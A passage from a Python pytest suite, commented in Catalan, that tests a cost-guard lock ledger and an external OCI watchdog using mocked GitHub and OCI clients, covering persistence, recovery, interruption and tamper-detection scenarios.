"""
Bateria de Proves Integrals d'Extrem a Extrem (Fase 6)
Subsistema CostGuard i Vigilant Extern OCI (scripts/oci_external_watchdog.py).

Aquest mòdul valida de manera integral, determinista i aïllada la conjunció de les fases 1 a 5:
- Grup A: Flux normal de bloqueig i persistència de dues àncores (Ledger GitHub + Tags OCI).
- Grup B: Reinici del procés i recuperació d'estat fred (cold recovery).
- Grup C: Interrupcions en els punts crítics de persistència (4 escenaris de tallada).
- Grup D: Inconsistències entre les dues àncores (truncació de cua, forquilles, hashes corruptes).
- Grup E: Recuperació administrativa autenticada (happy path, inventari brut, fallada OCI, replay).
- Grup F: Aturades OCI i cicle de vida estricte de verificació de STOPPED.
- Grup G: Idempotència i comportament davant execucions repetides.
"""

import json
import os
import sys
import time
import urllib.error
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional
from unittest.mock import MagicMock, patch

import pytest

from engine.cost_guard import (
    AUTHORIZED_BASELINE,
    CostGuard,
    GitHubIssueLedgerPersistenceBackend,
    LockPersistenceBackend,
)
from tests.test_cost_guard import make_event_comment
from scripts.oci_external_watchdog import (
    execute_administrative_recovery,
    run_watchdog,
    stop_oci_instance,
    start_oci_instance,
)


# =============================================================================
# Utilitats i Mocks Reutilitzables
# =============================================================================

class MockHttpResponse:
    """Simulador de resposta HTTP per a urllib.request."""
    def __init__(self, status: int, data: Any, headers: Optional[Dict[str, str]] = None):
        self.status = status
        self._data = data if isinstance(data, (bytes, bytearray)) else json.dumps(data).encode("utf-8")
        self.headers = headers or {}

    def read(self):
        return self._data

    def getheader(self, name, default=None):
        return self.headers.get(name, default)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        pass


class SimulatedGitHubLedgerServer:
    """
    Simulador en memòria d'un repositori GitHub amb Issue Ledger.
    Gestiona issues, llistat de comentaris, publicació (POST) i verificació read-after-write (GET).
    """
    def __init__(self, issue_number: int = 123):
        self.issue_number = issue_number
        self.comments: List[Dict[str, Any]] = []
        self.next_comment_id = 1000
        self.post_failure: Optional[Exception] = None
        self.read_after_write_failure: Optional[Exception] = None
        self.fetch_failure: Optional[Exception] = None

    def urlopen_handler(self, req, timeout=10):
        url = req.full_url if hasattr(req, "full_url") else req.get_full_url()
        method = req.get_method() if hasattr(req, "get_method") else "GET"

        if self.fetch_failure:
            raise self.fetch_failure

        # Endpoint de l'Issue
        if url.endswith(f"/issues/{self.issue_number}"):
            return MockHttpResponse(200, {"state": "open", "number": self.issue_number})

        # Llistat de comentaris (GET)
        if f"/issues/{self.issue_number}/comments" in url and method == "GET":
            return MockHttpResponse(200, list(self.comments))

        # Publicació de nou comentari (POST)
        if f"/issues/{self.issue_number}/comments" in url and method == "POST":
            if self.post_failure:
                raise self.post_failure
            req_data = json.loads(req.data.decode("utf-8"))
            body = req_data.get("body", "")
            cid = self.next_comment_id
            self.next_comment_id += 1
            now_iso = datetime.now(timezone.utc).isoformat()
            comment_obj = {
                "id": cid,
                "created_at": now_iso,
                "updated_at": now_iso,
                "body": body
            }
            self.comments.append(comment_obj)
            return MockHttpResponse(201, {"id": cid, "body": body})

        # Lectura individual de comentari per a read-after-write (GET)
        if "/issues/comments/" in url and method == "GET":
            cid = int(url.split("/issues/comments/")[1].split("?")[0])
            if self.read_after_write_failure:
                raise self.read_after_write_failure
            matching = next((c for c in self.comments if c["id"] == cid), None)
            if matching:
                return MockHttpResponse(200, dict(matching))
            return MockHttpResponse(404, {"message": "Not Found"})

        raise ValueError(f"SimulatedGitHubLedgerServer: Sol·licitud no suportada {method} {url}")


class SimulatedOCICompute:
    """
    Simulador del client OCI ComputeClient.
    Controla l'estat del cicle de vida, les etiquetes lliures (freeform_tags),
    el control de concurrència optimista mitjançant ETags (HTTP 412) i el sondeig.
    """
    def __init__(
        self,
        instance_ocid: str = "ocid1.instance.oc1..simulated_vm",
        initial_tags: Optional[Dict[str, str]] = None,
        initial_state: str = "RUNNING",
        initial_etag: str = "etag-v1"
    ):
        self.instance_ocid = instance_ocid
        self.lifecycle_state = initial_state
        self.freeform_tags = dict(initial_tags or {})
        self.etag = initial_etag
        self.etag_counter = 1
        self.stop_actions: List[str] = []
        self.update_failure: Optional[Exception] = None
        self.poll_states: List[Optional[str]] = []
        self.poll_index = 0

    def get_instance(self, ocid: str):
        if self.poll_states and self.poll_index < len(self.poll_states):
            state = self.poll_states[self.poll_index]
            self.poll_index += 1
        else:
            state = self.lifecycle_state

        class InstanceData:
            def __init__(self, st, tags):
                self.lifecycle_state = st
                self.freeform_tags = dict(tags)

        class GetResponse:
            def __init__(self, data, et):
                self.data = data
                self.headers = {"etag": et}

        return GetResponse(InstanceData(state, self.freeform_tags), self.etag)

    def update_instance(self, ocid: str, update_details: Any, if_match: Optional[str] = None):
        if self.update_failure:
            raise self.update_failure

        if if_match and if_match != self.etag:
            class Conflict412(Exception):
                status = 412
            raise Conflict412("HTTP 412: If-Match ETag condition failed")

        new_tags = getattr(update_details, "freeform_tags", {})
        self.freeform_tags = dict(new_tags)
        self.etag_counter += 1
        self.etag = f"etag-v{self.etag_counter}"

        class UpdateResponse:
            status = 200

        return UpdateResponse()

    def instance_action(self, ocid: str, action: str):
        self.stop_actions.append(action)
        if action == "STOP":
            if not self.poll_states:
                self.lifecycle_state = "STOPPED"

        class ActionResponse:
            status = 200

        return ActionResponse()


def setup_test_environment(monkeypatch, tmp_path):
    """Configura l'entorn aïllat amb variables d'entorn i fitxers temporals."""
    state_file = tmp_path / "cost_guard_state.json"
    summary_file = tmp_path / "step_summary.md"
    monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary_file))
    monkeypatch.setenv("OCI_TENANCY_OCID", "ocid1.tenancy.oc1..test_tenancy")
    monkeypatch.setenv("OCI_USER_OCID", "ocid1.user.oc1..test_user")
    monkeypatch.setenv("OCI_FINGERPRINT", "20:3b:97:13:55:1c:5b:0d:d3:37:d0:02:f4:91:38:13")
    monkeypatch.setenv("OCI_PRIVATE_KEY", "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0\n-----END RSA PRIVATE KEY-----")
    monkeypatch.setenv("OCI_COMPARTMENT_OCID", "ocid1.compartment.oc1..test_compartment")
    monkeypatch.setattr("scripts.oci_external_watchdog.get_oci_signer", lambda cfg: True)
    return state_file, summary_file


# =============================================================================
# GRUP A: Flux normal de bloqueig i persistència de dues àncores
# =============================================================================

def test_e2e_group_a_normal_lock_flow_and_persistence(tmp_path, monkeypatch):
    """
    A. FLUX NORMAL DE BLOQUEIG I PERSISTÈNCIA:
    1. Incident: recurs no autoritzat (VM.Standard3.Flex) detectat a l'inventari.
    2. Registre de bloqueig a l'estat local.
    3. Escriptura al GitHub Issue Ledger persistent (esdeveniment LOCKED, seq=1).
    4. Sincronització de Segona Àncora OCI amb ETag.
    5. Execució del watchdog extern.
    6. Comanda STOP acceptada per OCI.
    7. Polling confirma STOPPED.
    8. Bloqueig actiu després de l'aturada (can_restart = False).
    9. Coherència estricta entre estat local, Ledger i tags OCI.
    """
    state_file, summary_file = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=101)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=101)

    # 0. Estat inicial legítim: esdeveniment LOCKED inicial i posterior UNLOCKED (seqüència 1 i 2)
    c1 = make_event_comment(
        1,
        "init-lock-0",
        event_type="LOCKED",
        sequence=1,
        prev_hash="GENESIS",
        lock_reason="Setup inicial"
    )
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]

    c2 = make_event_comment(
        2,
        "init-unlock-0",
        event_type="UNLOCKED",
        sequence=2,
        prev_hash=h1,
        resolves_lock_id="init-lock-0",
        actor="bootstrap-admin",
        workflow_run_id="init-wf-0",
        unlock_reason="Baseline operatiu legítim"
    )
    h2 = json.loads(c2["body"].split("```json")[1].split("```")[0])["hash"]
    gh_server.comments.extend([c1, c2])

    # Àncora inicial sincronitzada a OCI a seqüència 2 (UNLOCKED)
    initial_tags = {
        "Project": "PreddicionsLliga",
        "economic_lock": "false",
        "ledger_sequence": "2",
        "ledger_hash": h2,
        "ledger_event_id": "init-unlock-0"
    }
    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..prod_vm",
        initial_tags=initial_tags,
        initial_state="RUNNING",
        initial_etag="etag-init"
    )

    # Monkeypatching d'OCI i urllib
    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        # 1-2. Inicialització de CostGuard sincronitzat amb les dues fonts
        guard = CostGuard(state_path=state_file, persistence_backend=backend, oci_anchor=initial_tags)
        assert guard.persistence_status == "OK"
        assert guard.can_restart()[0] is True

        # Simulem que un incident de despesa o recurs no autoritzat dispara el bloqueig
        rogue_prov = dict(AUTHORIZED_BASELINE)
        rogue_prov["shape"] = "VM.Standard3.Flex"  # Rogue paid shape

        summary = guard.evaluate(current_provisioning=rogue_prov, uptime_hours=744.0)
        assert summary["status"] in ("PREVENTIVE_SHUTDOWN", "RESTART_LOCKED")
        assert guard.state["restart_locked"] is True

        # 3. Comprovem que s'ha escrit el comentari LOCKED al GitHub Ledger (seqüència 3)
        assert len(gh_server.comments) == 3
        ledger_state, err = backend.get_state()
        assert err is None
        assert ledger_state["locked"] is True
        assert ledger_state["sequence"] == 3
        lock_event_id = ledger_state["event_id"]
        lock_hash = ledger_state["hash"]

        # 4-7. Executem el watchdog extern sobre la instància OCI
        monkeypatch.setattr("scripts.oci_external_watchdog.CostGuard", lambda *a, **kw: guard)
        watchdog_res = run_watchdog(
            mode="fast",
            instance_ocid="ocid1.instance.oc1..prod_vm",
            mock_provisioning=rogue_prov,
            dry_run=False
        )

        assert watchdog_res["watchdog_ok"] is True
        assert watchdog_res["can_restart"] is False
        stop_details = watchdog_res["stop_result"]
        assert stop_details["stop_accepted"] is True
        assert stop_details["instance_stopped"] is True
        assert stop_details["tag_applied"] is True

        # 8. Verifiquem que la instància OCI està físicament aturada i amb tags actualitzats
        assert oci_sim.lifecycle_state == "STOPPED"
        assert oci_sim.freeform_tags["economic_lock"] == "true"
        assert oci_sim.freeform_tags["ledger_sequence"] == "3"
        assert oci_sim.freeform_tags["ledger_hash"] == lock_hash
        assert oci_sim.freeform_tags["ledger_event_id"] == lock_event_id

        # 9. Coherència estricta entre les dues àncores
        coherent, anchor_err = CostGuard.verify_anchor_coherence(
            ledger_state=ledger_state,
            ledger_err=None,
            oci_anchor=oci_sim.freeform_tags
        )
        assert coherent is True
        assert anchor_err is None

        can_restart, reason = guard.can_restart()
        assert can_restart is False
        assert "Bloqueig econòmic" in reason


# =============================================================================
# GRUP B: Reinici del procés i recuperació d'estat fred (cold recovery)
# =============================================================================

def test_e2e_group_b_cold_state_recovery_across_processes(tmp_path, monkeypatch):
    """
    B. REINICI DEL PROCÉS I RECUPERACIÓ D'ESTAT:
    1. El procés anterior mor completament (es destrueix la instància guard en memòria).
    2. Es crea una nova instància CostGuard freda apuntant als fitxers persistents.
    3. Recupera l'estat des del Ledger i l'àncora OCI.
    4. El bloqueig es preserva (can_restart = False).
    5. Zero duplicació d'esdeveniments al ledger durant la recuperació.
    6. Un nou esdeveniment continua la seqüència correctament (seq=2, hash encadenat).
    """
    state_file, summary_file = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=102)
    backend1 = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=102)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard1 = CostGuard(state_path=state_file, persistence_backend=backend1)
        ok = guard1._persist_lock_state(locked=True, reason="Bloqueig incident inicial")
        assert ok is True
        assert len(gh_server.comments) == 1
        first_event = backend1.last_persisted_event
        seq1_hash = first_event["hash"]
        seq1_id = first_event["event_id"]

    # Tags existents a la VM d'OCI
    oci_tags = {
        "economic_lock": "true",
        "ledger_sequence": "1",
        "ledger_hash": seq1_hash,
        "ledger_event_id": seq1_id,
        "lock_reason": "Bloqueig incident inicial"
    }

    # 1. Destrucció de memòria del procés 1
    del guard1
    del backend1

    # 2-3. Nou procés fred: carrega fitxers i reconcilia
    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        backend2 = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=102)
        guard2 = CostGuard(state_path=state_file, persistence_backend=backend2, oci_anchor=oci_tags)

        # 4. Bloqueig estrictament preservat
        can_restart, reason = guard2.can_restart()
        assert can_restart is False
        assert guard2.state["restart_locked"] is True
        assert guard2.state["status"] == "RESTART_LOCKED"

        # 5. Zero comentaris afegits durant la lectura / reconciliació
        assert len(gh_server.comments) == 1

        # 6. Nova escriptura que continua la seqüència (seq 2)
        ok2 = guard2._persist_lock_state(locked=True, reason="Segon incident consecutiu")
        assert ok2 is True
        assert len(gh_server.comments) == 2

        second_event = backend2.last_persisted_event
        assert second_event["sequence"] == 2
        assert second_event["prev_hash"] == seq1_hash


# =============================================================================
# GRUP C: Interrupcions en punts crítics de persistència
# =============================================================================

def test_e2e_group_c1_interruption_after_local_write_before_ledger(tmp_path, monkeypatch):
    """
    C1. Interrupció després d'escriure estat local però abans de l'escriptura al GitHub Ledger.
    L'estat local té bloqueig, però el Ledger encara no té cap esdeveniment (o falla la xarxa).
    El procés recuperat aplica fail-closed: ABSENT -> can_restart = False.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=103)
    # Simulem que la xarxa cau durant l'escriptura al ledger
    gh_server.post_failure = Exception("Connection aborted by peer")
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=103)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        # L'escriptura falla
        ok = guard._persist_lock_state(locked=True, reason="Tallada abans del ledger")
        assert ok is False
        # El ledger roman buit
        assert len(gh_server.comments) == 0

    # Reinici del procés
    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        fresh_backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=103)
        fresh_guard = CostGuard(state_path=state_file, persistence_backend=fresh_backend)
        can_restart, _ = fresh_guard.can_restart()
        # Principi Fail-Closed: absència de ledger persistent impedeix el reinici
        assert can_restart is False
        assert fresh_guard.persistence_status == "ABSENT"


def test_e2e_group_c2_interruption_after_ledger_write_before_oci_tags(tmp_path, monkeypatch):
    """
    C2. Interrupció després d'escriure al GitHub Ledger però abans d'actualitzar l'àncora OCI.
    El ledger conté seqüència 2 (LOCKED), però OCI roman a la seqüència 1 (ancestre vàlid).
    El procés recuperat confirma que la seqüència OCI és un ancestre legítim i manté el bloqueig.
    Si el ledger conté UNLOCKED a seqüència 2 però OCI encara té economic_lock=true a seqüència 1,
    el reinici continua estrictament BLOQUEJAT fins a la sincronització a OCI.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=104)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=104)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Lock event 1")
        ev1 = backend.last_persisted_event

        # Actualització al ledger d'un segon esdeveniment de bloqueig
        guard._persist_lock_state(locked=True, reason="Lock event 2")
        ev2 = backend.last_persisted_event

    assert ev2["sequence"] == 2

    # Àncora OCI que va quedar desfasada a la seqüència 1
    stale_oci_anchor = {
        "economic_lock": "true",
        "ledger_sequence": "1",
        "ledger_hash": ev1["hash"],
        "ledger_event_id": ev1["event_id"],
        "lock_reason": "Lock event 1"
    }

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        reconciled_guard = CostGuard(
            state_path=state_file,
            persistence_backend=backend,
            oci_anchor=stale_oci_anchor
        )
        # La coherència d'ancestre s'aprova, però l'estat és LOCKED
        assert reconciled_guard.can_restart()[0] is False
        assert reconciled_guard.persistence_status == "OK"

    # Variant crítica: El ledger té UNLOCKED a seqüència 3, però OCI té seq 2 amb economic_lock=true
    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        unlock_payload = {
            "locked": False,
            "resolves_lock_id": ev2["event_id"],
            "actor": "admin",
            "workflow_run_id": "wf-1",
            "unlock_reason": "Recovery test"
        }
        backend.set_state(unlock_payload)
        ev3 = backend.last_persisted_event
        assert ev3["sequence"] == 3

        # OCI ancorat a ev2 (LOCKED)
        oci_anchor_ev2 = {
            "economic_lock": "true",
            "ledger_sequence": "2",
            "ledger_hash": ev2["hash"],
            "ledger_event_id": ev2["event_id"]
        }
        guard_unsynced = CostGuard(
            state_path=state_file,
            persistence_backend=backend,
            oci_anchor=oci_anchor_ev2
        )
        # Encara que GitHub tingui UNLOCKED, com que OCI encara no ha rebut el tag,
        # fail-closed: reinici BLOQUEJAT!
        assert guard_unsynced.can_restart()[0] is False
        assert "Desbloqueig pendent de sincronització" in guard_unsynced.state["lock_reason"]


def test_e2e_group_c3_interruption_after_oci_tags_before_local_save(tmp_path, monkeypatch):
    """
    C3. Interrupció després d'actualitzar OCI però abans de guardar l'estat local.
    Tant GitHub Ledger com OCI tenen l'esdeveniment LOCKED, però el fitxer local es perd o es corromp.
    El procés recuperat reconstrueix automàticament l'estat de bloqueig.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=105)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=105)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Lock crash test")
        ev = backend.last_persisted_event

    oci_tags = {
        "economic_lock": "true",
        "ledger_sequence": "1",
        "ledger_hash": ev["hash"],
        "ledger_event_id": ev["event_id"]
    }

    # Destruïm o eliminem el fitxer local
    if state_file.exists():
        state_file.unlink()

    # Nou procés sense fitxer local previ
    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        fresh_guard = CostGuard(
            state_path=state_file,
            persistence_backend=backend,
            oci_anchor=oci_tags
        )
        assert fresh_guard.can_restart()[0] is False
        assert fresh_guard.state["restart_locked"] is True
        assert fresh_guard.state["status"] == "RESTART_LOCKED"
        # El fitxer local ha estat recreat amb seguretat
        assert state_file.exists()


def test_e2e_group_c4_interruption_after_stop_command_before_stopped_confirmed(tmp_path, monkeypatch):
    """
    C4. Interrupció després d'enviar la comanda STOP d'OCI però abans de confirmar STOPPED.
    L'ordre STOP és acceptada, però el procés mor mentre la màquina és a STOPPING.
    El vigilant recuperat detecta l'estat transitori o completat i impedeix cap reinici.
    """
    state_file, summary_file = setup_test_environment(monkeypatch, tmp_path)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..stopping_vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": "1" * 64,
            "ledger_event_id": "lock-c4"
        },
        initial_state="STOPPING"
    )
    oci_sim.poll_states = ["STOPPING"] * 10

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    # Execució de stop_oci_instance amb VM que no arriba a STOPPED (es queda a STOPPING)
    stop_res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..stopping_vm",
        config={"tenancy": "ocid1.tenancy..test"},
        return_details=True,
        poll_interval_seconds=0.01,
        max_poll_attempts=2
    )

    assert stop_res["stop_accepted"] is True
    assert stop_res["instance_stopped"] is False
    assert stop_res["success"] is False
    assert "no ha arribat a l'estat STOPPED" in stop_res["warning"]


# =============================================================================
# GRUP D: Inconsistències entre les dues àncores (Byzantine & Divergence)
# =============================================================================

def test_e2e_group_d1_tail_truncation_oci_ahead_of_ledger():
    """
    D1. Truncació de cua: OCI conté la seqüència 3, però el Ledger de GitHub només té la 2.
    Això ocorre si algú elimina comentaris o esborra l'issue de GitHub.
    Rebuig fail-closed: MALFORMED -> can_restart = False.
    """
    ledger_state = {
        "sequence": 2,
        "hash": "a" * 64,
        "event_id": "ev-2",
        "locked": True,
        "events": [{"sequence": 1}, {"sequence": 2}]
    }
    oci_anchor = {
        "economic_lock": "true",
        "ledger_sequence": "3",  # OCI per davant de GitHub!
        "ledger_hash": "b" * 64,
        "ledger_event_id": "ev-3"
    }
    coherent, err = CostGuard.verify_anchor_coherence(ledger_state, None, oci_anchor)
    assert coherent is False
    assert "Truncació de cua detectada" in err


def test_e2e_group_d2_fork_divergent_ancestor():
    """
    D2. Forquilla o bifurcació d'historial:
    GitHub té seqüència 3, OCI té seqüència 2, però l'esdeveniment a seqüència 2
    a GitHub té un hash diferent del que té registrat l'àncora OCI.
    """
    ledger_state = {
        "sequence": 3,
        "hash": "c" * 64,
        "event_id": "ev-3",
        "locked": True,
        "events": [
            {"sequence": 1, "hash": "a" * 64, "event_id": "ev-1", "event_type": "LOCKED"},
            {"sequence": 2, "hash": "b" * 64, "event_id": "ev-2", "event_type": "LOCKED"},
            {"sequence": 3, "hash": "c" * 64, "event_id": "ev-3", "event_type": "LOCKED"}
        ]
    }
    oci_anchor = {
        "economic_lock": "true",
        "ledger_sequence": "2",
        "ledger_hash": "d" * 64,  # Hash discrepant a l'ancestre!
        "ledger_event_id": "ev-2"
    }
    coherent, err = CostGuard.verify_anchor_coherence(ledger_state, None, oci_anchor)
    assert coherent is False
    assert "Historial bifurcat" in err


def test_e2e_group_d3_hash_mismatch_same_sequence():
    """D3. Mateixa seqüència però hash diferent entre GitHub i OCI."""
    ledger_state = {"sequence": 2, "hash": "1" * 64, "event_id": "ev-2", "locked": True}
    oci_anchor = {
        "economic_lock": "true",
        "ledger_sequence": "2",
        "ledger_hash": "2" * 64,  # Discrepància
        "ledger_event_id": "ev-2"
    }
    coherent, err = CostGuard.verify_anchor_coherence(ledger_state, None, oci_anchor)
    assert coherent is False
    assert "Discrepància de hash a seqüència 2" in err


def test_e2e_group_d4_event_id_mismatch_same_sequence():
    """D4. Mateixa seqüència i hash, però event_id diferent."""
    ledger_state = {"sequence": 2, "hash": "1" * 64, "event_id": "ev-orig", "locked": True}
    oci_anchor = {
        "economic_lock": "true",
        "ledger_sequence": "2",
        "ledger_hash": "1" * 64,
        "ledger_event_id": "ev-spoofed"
    }
    coherent, err = CostGuard.verify_anchor_coherence(ledger_state, None, oci_anchor)
    assert coherent is False
    assert "Discrepància d'event_id a seqüència 2" in err


def test_e2e_group_d5_regressive_or_invalid_sequence_in_oci_tags():
    """D5. Seqüència zero, negativa o no numèrica a l'àncora OCI."""
    ledger_state = {"sequence": 2, "hash": "1" * 64, "event_id": "ev-2", "locked": True}

    for bad_seq in (0, -1, "zero", True, False):
        oci_anchor = {
            "economic_lock": "true",
            "ledger_sequence": bad_seq,
            "ledger_hash": "1" * 64,
            "ledger_event_id": "ev-2"
        }
        coherent, err = CostGuard.verify_anchor_coherence(ledger_state, None, oci_anchor)
        assert coherent is False
        assert "MALFORMED: Camp 'ledger_sequence'" in err


def test_e2e_group_d6_broken_ledger_hash_chain(tmp_path):
    """
    D6. Comentari intermedi alterat al GitHub Issue Ledger (trencament de cadena criptogràfica).
    _validate_ledger falla i CostGuard adopta estat PERSISTENCE_CORRUPT.
    """
    state_file = tmp_path / "state.json"
    gh_server = SimulatedGitHubLedgerServer(issue_number=106)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=106)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Event 1")
        guard._persist_lock_state(locked=True, reason="Event 2")
        guard._persist_lock_state(locked=True, reason="Event 3")
        assert len(gh_server.comments) == 3

    # Manipulem maliciosament el segon comentari a GitHub
    corrupted_body = gh_server.comments[1]["body"].replace("Event 2", "Tampered Event 2")
    gh_server.comments[1]["body"] = corrupted_body

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        fresh_guard = CostGuard(state_path=state_file, persistence_backend=backend)
        assert fresh_guard.persistence_status == "MALFORMED"
        assert fresh_guard.state["status"] == "PERSISTENCE_CORRUPT"
        assert fresh_guard.can_restart()[0] is False


def test_e2e_group_d7_both_sources_absent_fail_closed(tmp_path):
    """D7. Absència total de Ledger i àncora OCI -> fallada fail-closed, mai reinici."""
    state_file = tmp_path / "state.json"
    gh_server = SimulatedGitHubLedgerServer(issue_number=107)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=107)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend, oci_anchor=None)
        assert guard.persistence_status == "ABSENT"
        assert guard.can_restart()[0] is False
        assert guard.state["status"] == "PERSISTENCE_ABSENT"


# =============================================================================
# GRUP E: Recuperació administrativa autenticada
# =============================================================================

def test_e2e_group_e1_full_administrative_recovery_happy_path(tmp_path, monkeypatch):
    """
    E1. RECUPERACIÓ ADMINISTRATIVA COMPLETA (HAPPY PATH):
    1. Estat inicial: instància bloquejada (seq=1, LOCKED).
    2. Sol·licitud de recuperació administrativa per operador autoritzat.
    3. Validació d'inventari OCI net (0 recursos de pagament).
    4. Registre d'esdeveniment UNLOCKED al Ledger vinculat a resolves_lock_id.
    5. Actualització atòmica de la Segona Àncora OCI (economic_lock=false, seq=2).
    6. Reconciliació de CostGuard: status passa a OK.
    7. Un nou procés fred verifica can_restart = True.
    """
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=108)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=108)

    # 1. Bloqueig inicial
    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Bloqueig previ legítim")
        ev1 = backend.last_persisted_event
        lock_id = ev1["event_id"]

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..recov_vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": ev1["hash"],
            "ledger_event_id": lock_id,
            "lock_reason": "Bloqueig previ legítim"
        },
        initial_state="STOPPED"
    )

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: oci_sim
    mock_oci.core.models.UpdateInstanceDetails = lambda freeform_tags: MagicMock(freeform_tags=freeform_tags)
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    # 2-5. Execució de la recuperació administrativa
    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..recov_vm",
            actor="sec-admin",
            workflow_run_id="run-777",
            unlock_reason="Incidència analitzada i resolta",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )

        assert ok is True
        assert "completada amb èxit" in msg
        assert len(gh_server.comments) == 2

        # Verifiquem l'esdeveniment UNLOCKED al Ledger
        unlocked_state, _ = backend.get_state()
        assert unlocked_state["locked"] is False
        assert unlocked_state["sequence"] == 2
        assert unlocked_state["resolves_lock_id"] == lock_id

        # Verifiquem l'àncora d'OCI
        assert oci_sim.freeform_tags["economic_lock"] == "false"
        assert oci_sim.freeform_tags["ledger_sequence"] == "2"
        assert oci_sim.freeform_tags["ledger_event_id"] == unlocked_state["event_id"]
        assert "lock_reason" not in oci_sim.freeform_tags

    # 6-7. Verificació sobre un nou procés fred
    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        cold_guard = CostGuard(
            state_path=state_file,
            persistence_backend=backend,
            oci_anchor=oci_sim.freeform_tags
        )
        can_restart, reason = cold_guard.can_restart()
        assert can_restart is True
        assert reason is None
        assert cold_guard.state["status"] == "OK"
        assert cold_guard.state["restart_locked"] is False


def test_e2e_group_e2_recovery_blocked_by_unauthorized_inventory(tmp_path, monkeypatch):
    """E2. Recuperació administrativa rebutjada si l'inventari conté recursos de pagament."""
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=109)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=109)

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)
        guard._persist_lock_state(locked=True, reason="Bloqueig previ")

    unauthorized_prov = dict(AUTHORIZED_BASELINE)
    unauthorized_prov["shape"] = "VM.Standard3.Flex"  # Rogue shape

    oci_sim = SimulatedOCICompute(instance_ocid="ocid1.instance.oc1..vm")

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-admin",
            unlock_reason="Auditoria autoritzada",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=unauthorized_prov
        )
        assert ok is False
        assert "Recuperació denegada: l'inventari OCI conté recursos no autoritzats" in msg
        # El ledger no s'ha tocat
        assert len(gh_server.comments) == 1


def test_e2e_group_e3_recovery_interrupted_at_oci_tagging(tmp_path, monkeypatch):
    """
